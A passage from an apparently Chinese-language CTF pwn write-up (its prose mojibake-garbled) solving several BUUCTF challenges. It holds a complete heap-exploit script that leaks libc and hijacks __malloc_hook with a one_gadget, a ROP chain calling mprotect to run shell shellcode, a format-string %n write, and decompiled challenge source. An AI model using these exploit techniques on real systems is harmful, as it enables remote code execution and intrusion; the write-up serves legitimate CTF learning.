<li><code>e</code>è¢«é‡Šæ”¾åè¿›å…¥ unsorted binï¼Œæ‰€ä»¥å…¶<code>fd</code>ä¸<code>bk</code>éƒ½æŒ‡å‘ unsorted bin çš„é“¾è¡¨å¤´ï¼Œæ³¨æ„å…¶åœ°å€åˆ° libc åŸºå€çš„åç§»æ˜¯å›ºå®šçš„<code>0x3c4b78</code>ã€‚</li>
</ol>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># e-&gt;chunk_size = 0x91</span></span><br><span class="line">payload = flat([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x91</span>])</span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># f5</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment"># e, e-&gt;fd = unsorted_head</span></span><br><span class="line"></span><br><span class="line">base = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>])<span class="number">-0x3c4b78</span></span><br></pre></td></tr></table></figure>

<p>æœ€åçš„<code>dump(2)</code>å°±æ˜¯æ‰“å°ç´¢å¼•ä¸º<code>2</code>çš„ chunkï¼Œä¹Ÿå°±æ˜¯<code>e</code>ï¼Œä»è€Œå¾—åˆ°<code>e</code>çš„<code>fd</code>å’Œ<code>bk</code>ã€‚</p>
<p>ä¹‹åï¼Œå†æ¬¡ä½¿ç”¨ fast bin attack å°† libc ä¸­å‡½æ•°ï¼Œä¾‹å¦‚<code>__malloc_hook</code>æ”¾å…¥ fast binï¼Œç„¶åç”¨<code>malloc</code>è¿”å›ç»™æˆ‘ä»¬ï¼Œå°±å¯ä»¥å®ç°ç±»ä¼¼ GOT åŠ«æŒçš„æ•ˆæœã€‚<code>__malloc_hook</code>åªè¦éç©ºï¼Œå°±ä¼šåœ¨<code>malloc</code>æ—¶è¢«è°ƒç”¨ï¼Œæˆ‘ä»¬è®©å®ƒæŒ‡å‘<code>one_gadget</code>æ‰¾åˆ°çš„ä¸€ä¸ª gadget å³å¯ï¼Œæ¯”å¦‚å¯ä»¥ç”¨è·ç¦» libc åŸºå€ 0x4526a çš„ gadgetã€‚</p>
<p>ä½†æ˜¯åŒæ ·çš„ï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡ä¸Šé¢çš„å®‰å…¨æ£€æŸ¥ã€‚å¹¸è¿çš„æ˜¯ï¼Œè¯¥æ£€æŸ¥å¯¹äºå¯¹é½æ²¡æœ‰ä»»ä½•è¦æ±‚ã€‚é€šè¿‡ gdb è°ƒè¯•æˆ‘ä»¬å‘ç°åœ¨<code>__malloc_hook</code>é™„è¿‘çš„<code>_IO_wide_data_0+304</code>ä½ç½®å…¶é«˜ä½å­—èŠ‚ä¸º<code>7f</code>è€Œä½ä½å­—èŠ‚å«æœ‰è¿ç»­çš„<code>00</code>ï¼Œå› æ­¤å¯ä»¥é€šè¿‡å¢åŠ ä¸€äº›åç§»è·å¾—<code>0x7f</code>è¿™ä¸ªæ•°å€¼ä½œä¸º<code>chunk_size</code>ï¼Œæ°å¥½èƒ½é€šè¿‡æ£€æŸ¥ã€‚</p>
<p>å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;32xg (long long)(&amp;main_arena)-0x40</span><br><span class="line">0x7f16d95deae0 &lt;_IO_wide_data_0+288&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f16d95deaf0 &lt;_IO_wide_data_0+304&gt;:	0x00007f16d95dd260	0x0000000000000000</span><br><span class="line">0x7f16d95deb00 &lt;__memalign_hook&gt;:	0x00007f16d929fe20	0x00007f16d929fa00</span><br><span class="line">0x7f16d95deb10 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬åŠ  13 å­—èŠ‚åç§»ï¼ˆå¾ªç¯å³ç§»ï¼‰ï¼ŒæˆåŠŸä¼ªé€ <code>chunk_size</code>ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;32xg (long long)(&amp;main_arena)-0x40+0xd</span><br><span class="line">0x7f16d95deaed &lt;_IO_wide_data_0+301&gt;:	0x16d95dd260000000	0x000000000000007f</span><br><span class="line">0x7f16d95deafd:	0x16d929fe20000000	0x16d929fa0000007f</span><br><span class="line">0x7f16d95deb0d &lt;__realloc_hook+5&gt;:	0x000000000000007f	0x0000000000000000</span><br><span class="line">0x7f16d95deb1d:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p><code>0x7f</code>å¯¹åº”çš„<code>malloc</code>è¯·æ±‚å¤§å°å¤§çº¦æ˜¯<code>0x60</code>ã€‚ç°åœ¨ï¼Œfreelist é¡¶éƒ¨æ˜¯<code>e</code>ï¼Œäºæ˜¯<code>alloc(0x60)</code>å°±ä¼šåˆ†é…æ€»å¤§å°ä¸º<code>0x71</code>ã€èµ·ç‚¹ä¸<code>e</code>ç›¸åŒã€ä¸”ç´¢å¼•ä¸º<code>4</code>çš„ chunk<code>g</code>ï¼Œè¿™æ—¶å†<code>free</code>æ‰<code>g</code>å°±ä¼šä½¿å¾—<code>g</code>ä½äº freelist é¡¶éƒ¨ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x60</span>) <span class="comment"># g4</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment"># g</span></span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥ä¿®æ”¹ç´¢å¼•ä¸º<code>2</code>çš„ chunk çš„<code>fd</code>ï¼ˆå®é™…å°±æ˜¯ä¸ºäº†ä¿®æ”¹<code>e</code>æˆ–è€…è¯´<code>g</code>çš„<code>fd</code>ï¼‰æŒ‡å‘<code>_IO_wide_data_0+301</code>åœ°å€ï¼Œç„¶åç¬¬ä¸€æ¬¡<code>Allocate</code>å¾—åˆ°<code>g</code>ä½äºç´¢å¼•<code>5</code>ï¼Œç¬¬äºŒæ¬¡<code>Allocate</code>å¾—åˆ°æŒ‡å‘<code>_IO_wide_data_0+301</code>çš„æŒ‡é’ˆï¼Œä½äºç´¢å¼•<code>6</code>ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># g-&gt;fd = _IO()</span></span><br><span class="line">payload = p64(base+<span class="number">0x3c4aed</span>)</span><br><span class="line">fill(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment"># g5</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment"># _IO()6</span></span><br></pre></td></tr></table></figure>

<p>è€Œç”±ä¸Šé¢çš„ gdb åˆ†æå¯çŸ¥å¾—åˆ°çš„æŒ‡é’ˆä½äº<code>0xaed</code>ï¼Œ<code>__malloc_hook</code>ä½äº<code>0xb10</code>ï¼ˆPIE ä¸‹ä½ 12 ä½å›ºå®šï¼‰ï¼Œç›¸å·®<code>0x13</code>ã€‚å› æ­¤å¡«å……<code>0x13</code>å­—èŠ‚çš„ padding åå†æ”¾ä¸Š getshell çš„ gadget åœ°å€å³å¯ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _IO() + 13 == __malloc_hook(), one_gadget</span></span><br><span class="line">payload = flat([<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x13</span>, base+<span class="number">0x4526a</span>])</span><br><span class="line">fill(<span class="number">6</span>, payload)</span><br></pre></td></tr></table></figure>

<p>æœ€åä¸è¦å¿˜è®°å†ç”³è¯·ä¸€æ¬¡ä»»æ„å¤§å°å†…å­˜ä»¥è°ƒç”¨<code>__malloc_hook</code>ã€‚å®Œæ•´ expï¼Œæ³¨æ„æœ€åä¸€æ¬¡ alloc è¿”å›å¾—æœ‰ç‚¹æ…¢ï¼Œ<code>recvuntil</code>æœ€å¥½åŠ ä¸€ä¸ª<code>timeout</code>ï¼š</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">size</span>):</span></span><br><span class="line">    sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    ru(<span class="string">&#x27;: &#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">idx, data</span>):</span></span><br><span class="line">    sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(data)))</span><br><span class="line">    sa(<span class="string">&#x27;: &#x27;</span>, data)</span><br><span class="line">    ru(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sl(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sl(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&#x27;: \n&#x27;</span>)</span><br><span class="line">    data = p.ru(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	alloc(<span class="number">0x10</span>) <span class="comment"># a0,b1,c2,d3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># e4</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># b</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment"># c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c-&gt;fd = e</span></span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x21</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x21</span>,<span class="string">&#x27;\x80&#x27;</span>)</span><br><span class="line">fill(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># e-&gt;chunk_size = 0x21</span></span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment"># c1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment"># e2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># e-&gt;chunk_size = 0x91</span></span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># f5</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment"># e, e-&gt;fd = unsorted_head</span></span><br><span class="line"></span><br><span class="line">base = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>])<span class="number">-0x3c4b78</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment"># g4</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment"># g</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># g-&gt;fd = _IO()</span></span><br><span class="line">payload = p64(base+<span class="number">0x3c4aed</span>)</span><br><span class="line">fill(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment"># g5</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment"># _IO()6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># _IO() + 0x13 == __malloc_hook(), one_gadget</span></span><br><span class="line">payload = flat(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x13</span>,p64(base+<span class="number">0x4526a</span>))</span><br><span class="line">fill(<span class="number">6</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc() -&gt; __malloc_hook()</span></span><br><span class="line">alloc(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>


<h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><p>æœ¬åœ°è¿è¡Œè„šæœ¬ï¼š</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">get_flag = <span class="number">0x80489a0</span></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>,get_flag,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,<span class="number">0x308cd64f</span>,<span class="number">0x195719d1</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> r()</span><br></pre></td></tr></table></figure>

<p>æœ¬æ¥è¿™æ ·æ˜¯å¯ä»¥ç›´æ¥è¯»å– flag çš„ï¼Œä½†æ˜¯è¿œç¨‹ä¸è¡Œã€‚å› æ­¤è¿œç¨‹è¿è¡Œæ—¶æ¢äº†ä¸€ç§æ›´å…·éš¾åº¦çš„æ–¹æ³•ï¼Œå°±æ˜¯è°ƒç”¨<code>mprotect</code>ä¿®æ”¹<code>bss</code>æ®µæƒé™ä½¿å¾—å…¶å¯æ‰§è¡Œï¼Œéšåå†™å…¥ shellcodeã€‚</p>
<p>éœ€è¦æ³¨æ„<code>mprotect</code>ç¬¬äºŒä¸ªå‚æ•°è¦æ±‚é¡µå¯¹é½ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸º<code>7</code>è¡¨ç¤º<code>rwx</code>ã€‚ä¿®æ”¹å®Œæˆåä»æ ‡å‡†è¾“å…¥è¯»å…¥ shellcodeï¼Œå†™å…¥<code>bss_base</code>åè¿”å›åˆ°<code>bss_base</code>å¤„æ‰§è¡Œã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop3 = <span class="number">0x80483b8</span></span><br><span class="line">got_base = <span class="number">0x80eb000</span></span><br><span class="line">bss_base = elf.bss()</span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>,elf.sym[<span class="string">&#x27;mprotect&#x27;</span>],pop3,got_base,<span class="number">0x1000</span>,<span class="number">7</span>,elf.sym[<span class="string">&#x27;read&#x27;</span>],pop3,<span class="number">0</span>,bss_base,<span class="number">0x200</span>,bss_base)</span><br><span class="line">sl(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(asm(shellcraft.sh()))</span><br></pre></td></tr></table></figure>

<h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><p>å’Œä¸Šé¢ get_started åšæ³•ä¸€æ ·ã€‚æˆ‘æ€€ç–‘ BUU ä¸Šä¸€é¢˜åœ¨æœåŠ¡å™¨ä¸Šæ”¾é”™äº†äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¹Ÿæ”¾äº†è¿™ä¸€é¢˜çš„ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªè„šæœ¬æ‰ä¼šæ— æ•ˆã€‚</p>
<h2 id="ç¬¬äº”ç©ºé—´-2019-å†³èµ›-PWN5"><a href="#ç¬¬äº”ç©ºé—´-2019-å†³èµ›-PWN5" class="headerlink" title="[ç¬¬äº”ç©ºé—´ 2019 å†³èµ›]PWN5"></a>[ç¬¬äº”ç©ºé—´ 2019 å†³èµ›]PWN5</h2><p>é•¿åº¦é™åˆ¶æ— æ³•æ ˆæº¢å‡ºï¼Œä½†æ˜¯å­˜åœ¨æ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚é€šè¿‡<code>aaaa %08x %08x ...</code>å¯ä»¥åˆ¤æ–­åç§»ä¸º 10ã€‚</p>
<p>ç„¶ååˆ©ç”¨<code>%10$n</code>ä¿®æ”¹<code>0x804c044</code>åœ°å€ï¼ˆIDA å¾—åˆ°ï¼‰å¤„çš„å€¼å³å¯ï¼Œæœ€åè¾“å…¥<code>passwd</code>éœ€è¦ä¸å·²æˆåŠŸè¾“å‡ºçš„å­—ç¬¦æ•°ç›¸ç­‰ã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä¿®æ”¹<code>atoi</code>çš„ GOT åœ°å€ä¸º<code>system</code>çš„ PLT åœ°å€ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&#x27;:&#x27;</span>, p32(<span class="number">0x804c044</span>) + <span class="string">&#x27;%10$n&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>IDA å¯çŸ¥éœ€è¦è®© var çš„ä¸‹æ ‡ä¸º 13 çš„å…ƒç´ ï¼ˆä¹Ÿå°±æ˜¯ç¬¬ 14 ä¸ªï¼‰ç­‰äº 17ï¼Œç›´æ¥æŒ‰ç…§éœ€æ±‚å†™è„šæœ¬å³å¯ï¼š</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sl(p32(<span class="number">17</span>)*<span class="number">14</span>)</span><br></pre></td></tr></table></figure>

<h2 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h2><p>æœ¬é¢˜æºç å¤§è‡´å¦‚ä¸‹ï¼Œå¼€å¯äº† canary å’Œ NXï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl __noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v0; <span class="comment">// [esp+3h] [ebp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> action; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">size_t</span> input; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;0: Add a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1: Delete a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2: Display a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3: Update a user description&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4: Exit&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Action: &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;action) == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !action )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size of description: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%u%c&quot;</span>, &amp;input, &amp;v0);</span><br><span class="line">      add(input);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( action == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">      <span class="keyword">delete</span>((<span class="keyword">unsigned</span> __int8)input);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( action == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">      display((<span class="keyword">unsigned</span> __int8)input);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( action == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">      update(input);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( action == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)total_users &gt; <span class="number">0x31</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;maximum capacity exceeded, bye&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>æˆ‘ä»¬é‡ç‚¹å…³æ³¨å¯èƒ½å­˜åœ¨æ¼æ´çš„<code>add</code>å’Œ<code>update</code>ï¼Œé¦–å…ˆæ˜¯<code>add</code>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__cdecl <span class="title">add</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *desc; <span class="comment">// ST24_4</span></span><br><span class="line">  _DWORD *user; <span class="comment">// ST28_4</span></span><br><span class="line"></span><br><span class="line">  desc = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="built_in">memset</span>(desc, <span class="number">0</span>, size);</span><br><span class="line">  user = <span class="built_in">malloc</span>(<span class="number">0x80</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(user, <span class="number">0</span>, <span class="number">0x80</span>u);</span><br><span class="line">  *user = desc;</span><br><span class="line">  users[(<span class="keyword">unsigned</span> __int8)total_users] = user;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;name: &quot;</span>);</span><br><span class="line">  read_name((<span class="keyword">char</span> *)users[(<span class="keyword">unsigned</span> __int8)total_users] + <span class="number">4</span>, <span class="number">124</span>);</span><br><span class="line">  update(++total_users - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> user;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥å¤§è‡´äº†è§£åˆ°<code>user</code>ç»“æ„ä½“å¤§çº¦é•¿è¿™æ ·ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> *description;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">124</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„<code>descrption</code>æ˜¯<code>user</code>å¼€å§‹çš„åœ°æ–¹ã€‚</p>
<p>éšåå‘ç°<code>update</code>ä¸­å­˜åœ¨ä¸€å¤„é˜²æŠ¤æªæ–½ï¼š</p>
